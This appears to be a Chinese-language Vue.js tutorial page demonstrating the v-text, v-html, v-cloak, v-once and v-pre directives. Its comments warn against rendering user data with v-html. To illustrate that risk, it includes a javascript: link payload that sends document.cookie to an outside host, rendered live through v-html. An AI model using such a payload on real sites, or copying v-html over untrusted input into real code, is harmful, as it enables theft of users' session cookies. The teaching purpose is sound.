<!DOCTYPE html>
<html>

	<head>
		<meta charset="UTF-8" />
		<title>标题</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			[v-clock] {
				display: none;
			}
		</style>
	</head>

	<body>
		<!-- 
			v-text
				向所在节点中渲染文本内容
				v-text会替换掉节点中的内容 插值语法不会
				
			v-html
				向指定节点中渲染包含html结构的内容
					v-html会替换掉节点中的所有内容 插值语法不会
					v-html可以识别html结构
				v-html存在安全性问题 再网站上动态渲染html存在风险
					不能再用户提交的数据上使用v-html
					
			v-cloak
				用于js加载缓慢导致出现未经渲染的内容 需要与style配合使用
				
			v-once
				所在节点再初次动态渲染后 就视为静态内容
				之后数据的改变不会再引起所在节点内容的更新 用于优化性能
				
			v-pre
				跳过所在节点的编译过程 没有指定语法、插值语法的节点 能加快编译
				不能在复杂节点添加 会导致整个页面出错<button @click="number++">
		 -->
		<div id="root">
			<h1 v-cloak>欢迎登录，{{name}}</h1>
			<h1 v-text="msg"></h1>
			<h1 v-html="msg"></h1>
			<h1 v-text="str"></h1>
			<h1 v-html="str"></h1>

			<h2 v-once>原始数字:{{number}}</h2>
			<h2>数字:{{number}}</h2>
			<button @click="number++">点击更新数字</button>
			
			<h2 v-pre>静态内容</h2>
			<h2 v-pre>数字:{{number}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		new Vue({
			el: '#root',
			data: {
				name: 'Flan',
				msg: '<h3>欢迎登录</h3>',
				str: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击跳转',
				number: 1
			}
		})
	</script>
</html>
